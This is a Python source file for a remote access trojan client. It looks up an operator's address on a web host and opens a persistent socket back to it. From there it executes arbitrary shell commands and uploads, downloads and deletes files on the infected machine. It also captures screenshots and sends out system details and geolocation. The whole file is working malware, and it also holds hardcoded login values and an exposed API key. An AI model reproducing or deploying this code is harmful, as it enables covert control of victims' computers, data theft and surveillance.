import socket
import subprocess
import os
import time
import requests
from bs4 import BeautifulSoup
import pyautogui
import json
import platform

def get_ip():
    """Find the ip address from webhost"""
    formdata = {
    'username': 'Pelle Peloton',
    'password': 'rotta',
    }
    
    #r = requests.post("http://localhost:8080/rat/index.php", data=formdata)
    r = requests.post("https://ratmasters.000webhostapp.com/", data=formdata)
    bs = BeautifulSoup(r.text, 'html.parser')
    ip = bs.find('span', {'id':'ip'})
    port = bs.find('span', {'id':'port'})
    # return ip.text
    return ip.text
    #print(ip.text)


os.system("color")

    # HEADER = '\033[95m'
    # OKBLUE = '\033[94m'
    # OKCYAN = '\033[96m'
    # OKGREEN = '\033[92m'
    # WARNING = '\033[93m'
    # FAIL = '\033[91m'
    # ENDC = '\033[0m'
    # BOLD = '\033[1m'
    # UNDERLINE = '\033[4m'


payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# payload.connect(("192.168.127.131", 8888)) #Kali Linux
payload.connect((get_ip(), 80)) #Win 10

def recv_data():
    original_size = payload.recv(2048).decode('utf-8')
    original_size = int(original_size)
    data = payload.recv(2048)
    while len(data) != original_size:
        data = data + payload.recv(2048)
    return data

def send_data(output_data):
    size_of_data = str(len(output_data))
    payload.send(bytes(size_of_data,'utf8'))
    time.sleep(2)
    payload.send(output_data)


def geo():
    """function to display geographic location based on ip address"""
    url = "https://ip-geo-location.p.rapidapi.com/ip/check"
    querystring = {"format":"json"}
    headers = {
        "X-RapidAPI-Host": "ip-geo-location.p.rapidapi.com",
        "X-RapidAPI-Key": "32817552b9msh76d99ce4ae9c87fp1520f9jsn63fc1b2efaa1"
    }
    response = requests.request("GET", url, headers=headers, params=querystring)

    testi = json.loads(response.text)
    return f"""\nCountry:\t{testi['country']['name']}\nCity:\t\t{testi['city']['name']}\n\
PostCode:\t{testi['postcode']}\nArea:\t\t{testi['area']['name']}\nLatitude:\t{testi['location']['latitude']}
Longitude:\t{testi['location']['longitude']}\n"""
    # print(response.text)

def sysinfo():
    """function to print system info"""
    # info = '{"hello":"moikka", "juu":"jee"}'
    # return info
    return f"""\nArchitecture:\t{platform.machine()}\nPlatform:\t{platform.platform()}
Processor:\t{platform.processor()}\nName:\t\t{platform.node()}\nSystem:\t\t{platform.system()}\n"""

def update():
    machine = platform.machine()
    os = platform.platform()
    system = platform.system()
    ip = socket.gethostbyname(socket.gethostname())
    processor = platform.processor()
    release = platform.release()
    return f"{machine},{os},{system},{ip},{processor}"

while True:
    cmd = payload.recv(2048).decode('utf8')
    if cmd == '':
        continue
    if cmd == 'exit':
        payload.close()
        break
    elif cmd[:2] == 'cd':
        if os.path.exists(cmd[3:]):
            os.chdir(cmd[3:])
            send_data(b'\033[92m\nDirectory changed to ' + bytes(f"{os.getcwd()}\033[0m\n",'utf-8'))
            continue
        else:
            send_data(b'\033[91m\ninvalid path\033[0m\n')
            continue
    elif cmd[:8] == 'download':
        try:
            with open(cmd[9:], 'rb') as data:
                data_read = data.read()
        except FileNotFoundError:
            send_data(b'not found')
        else:
            send_data(data_read)
        continue
    elif cmd[:6] == 'upload':
        data = recv_data()
        with open(cmd[7:], 'wb') as write_data:
            write_data.write(data)
        continue
    elif cmd == 'screen':
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        continue
    elif cmd[:6] == 'delete':
        if os.path.exists(cmd[7:]):
            os.remove(cmd[7:])
            send_data(b'\033[92m\nfile deleted\033[0m\n')
        else:
            send_data(b'\033[91m\nfile not found\033[0m\n')
        continue
    elif cmd == 'geo':
        send_data(geo().encode('utf-8'))
        continue
    elif cmd == 'sysinfo':
        send_data(sysinfo().encode('utf-8'))
        # send_data(sysinfo())
        continue
    elif cmd == 'update':
        send_data(str(update()).encode('utf8'))
        continue
    elif cmd == 'help':
        continue
    elif cmd == 'cls':
        continue
    try:
        output = subprocess.check_output(cmd, shell=True)
        if len(output) == 0:
            continue
        
    except subprocess.CalledProcessError:
        send_data(b'\033[91m\nInvalid Command\033[0m\n')
    else:
        send_data(output) 

